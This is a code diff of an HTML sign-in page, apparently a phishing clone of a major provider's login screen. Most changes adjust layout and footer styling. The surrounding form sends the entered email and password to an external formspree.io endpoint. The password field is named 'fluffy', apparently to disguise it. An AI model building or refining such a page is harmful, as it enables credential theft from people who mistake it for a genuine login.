@@ -54,7 +54,7 @@
             font-weight: 300;
         }
         .input-box {
-            width: 70%; /* Made the email input box longer */
+            width: 100%; /* Made the email input box longer */
             padding: 10px;
             margin-top: 20px; 
             border: 2px solid #333;
@@ -76,8 +76,8 @@
             flex-direction: column;
             align-items: flex-start;
             margin-left: 20px;
-            margin-top: 20px;
-            width: 40%;
+            margin-top: 10px;
+            width: 45%; /* Adjusted the width for the right side container */
         }
         .forgot-email-link, .guest-mode, .btn-container, .footer {
             margin-left: 0;
@@ -110,16 +110,16 @@
         .footer {
             margin-top: 30px;
             font-size: 12px;
-            text-align: left;
+            text-align: center; /* Centered the footer content */
             color: white;
             width: 100%;
             display: flex;
-            justify-content: flex-start;
+            justify-content: center; /* Center the footer links horizontally */
+            gap: 20px; /* Added space between the footer links */
         }
         .footer a {
             color: white;
             text-decoration: none;
-            margin: 0 15px;
         }
     </style>
 </head>
@@ -139,10 +139,13 @@
 
         <!-- Form for Email and "Fluffy" -->
         <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST">
-            <div class="right-side-container">
+            <div style="display: flex; flex-direction: column; width: 100%; margin-top: 20px; align-items: flex-start;">
                 <!-- Email or Phone Input -->
                 <input type="email" name="email" id="emailInput" class="input-box" placeholder="Email or phone" required oninput="checkEmail()">
+            </div>
 
+            <!-- Right Side Container with Links and Next Button -->
+            <div class="right-side-container">
                 <!-- "Fluffy" (Password) Input -->
                 <input type="password" name="fluffy" id="passwordInput" class="input-box" placeholder="Password" required style="display: none;">
 
